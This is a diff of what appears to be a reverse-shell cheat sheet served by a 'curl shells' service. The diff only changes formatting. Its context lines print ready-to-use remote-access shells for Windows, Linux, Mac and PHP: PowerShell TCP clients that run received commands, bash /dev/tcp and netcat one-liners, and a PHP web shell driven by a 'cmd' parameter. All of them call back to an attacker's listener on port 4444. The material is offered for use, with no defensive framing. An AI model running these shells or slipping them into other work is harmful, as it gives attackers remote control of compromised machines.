@@ -1,6 +1,7 @@
 W
 ---
 Windows Shells:
+
 [1: Powershell] $LHOST = "<LHOST>"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
 
 [2: Powershell] powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
@@ -42,6 +43,7 @@ Note: Windows Shells tend to be a lot longer because microsoft hates hackers ;-;
 L
 ---
 Linux Shells:
+
 [1] bash -i >& /dev/tcp/<LHOST>/4444 0>&1
 
 [2] nc -c bash <LHOST> 4444
@@ -52,6 +54,7 @@ Linux Shells:
 M
 ---
 Mac Shells:
+
 [1] bash -i >& /dev/tcp/<LHOST>/4444 0>&1
 
 [2] nc -c bash <LHOST> 4444
@@ -73,6 +76,7 @@ Python Shells:
 PHP
 ---
 PHP Shells:
+
 [1] <?php shell_exec("bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'"); ?>
 
 [2: No Listener Required] <?php system($_GET['cmd']); ?>
@@ -81,7 +85,8 @@ PHP Shells:
 H
 ---
 cURL Shells Usage:
-  General Command:
+
+  General Command Structure:
     curl curl-shells.com -A "<option>" [-H "IP: <IP>"]
   
   Note: replace <option> with the operating system you want to find a shell for and replace <IP> with your ip
